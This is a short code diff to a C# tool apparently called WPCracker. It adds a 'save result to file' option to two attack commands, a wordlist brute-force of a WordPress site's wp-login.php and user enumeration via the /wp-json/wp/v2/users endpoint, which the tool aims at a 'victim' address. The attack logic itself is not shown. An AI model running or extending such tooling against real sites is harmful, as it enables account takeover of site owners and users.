@@ -39,10 +39,13 @@ namespace WPCracker
 
             [ArgDefaultValue(1000), ArgShortcut("c"), ArgDescription("Maximum size of test batch per thread")]
             public int BatchCount { get; set; }
+            
+            [ArgShortcut("o"), ArgDescription("Save result to file")]
+            public string OutFilePath { get; set; }
 
             public void Main()
             {
-                Attacks.BruteForceAttack(TargetUri + "/wp-login.php", Username, WordlistPath, MaxThreads, BatchCount);
+                Attacks.BruteForceAttack(TargetUri + "/wp-login.php", Username, WordlistPath, MaxThreads, BatchCount, OutFilePath);
                 Console.ReadLine();
             }
         }
@@ -54,10 +57,13 @@ namespace WPCracker
 
             [ArgRequired(PromptIfMissing = true), ArgShortcut("u"), ArgDescription("The victim's HTTP web address")]
             public string TargetUri { get; set; }
+            
+            [ArgShortcut("o"), ArgDescription("Save result to file")]
+            public string OutFilePath { get; set; }
 
             public void Main()
             {
-                Attacks.UserEnum(TargetUri + "/wp-json/wp/v2/users");
+                Attacks.UserEnum(TargetUri + "/wp-json/wp/v2/users",  OutFilePath);
                 Console.ReadLine();
             }
         }
